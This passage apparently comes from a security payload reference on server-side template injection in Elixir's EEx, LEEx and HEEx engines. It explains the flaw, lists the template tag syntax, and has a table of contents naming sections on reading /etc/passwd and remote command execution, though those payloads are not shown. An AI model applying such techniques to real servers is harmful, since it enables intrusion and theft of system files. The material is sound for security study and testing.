text: # Server Side Template Injection - Elixir > Server-Side Template Injection (SSTI) is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Elixir, SSTI can occur when using templating engines like EEx (Embedded Elixir), especially when user input is incorporated into templates without proper sanitization or validation. ## Summary - [Templating Libraries](#templating-libraries) - [Universal Payloads](#universal-payloads) - [EEx](#eex) - [EEx - Basic injections](#eex---basic-injections) - [EEx - Retrieve /etc/passwd](#eex---retrieve-etcpasswd) - [EEx - Remote Command execution](#eex---remote-command-execution) - [References](#references) ## Templating Libraries | Template Name | Payload Format | |---------------|----------------| | EEx | `<%= %>` | | LEEx | `<%= %>` | | HEEx | `<%= %>` | ## Universal Payloads Generic code injection payloads work for many Elixir-based template engines, such as EEx, LEEx and HEEx. By default, only EEx can render templates from string, but it is possible to use LEEx and HEEx as replacement engines for EEx.
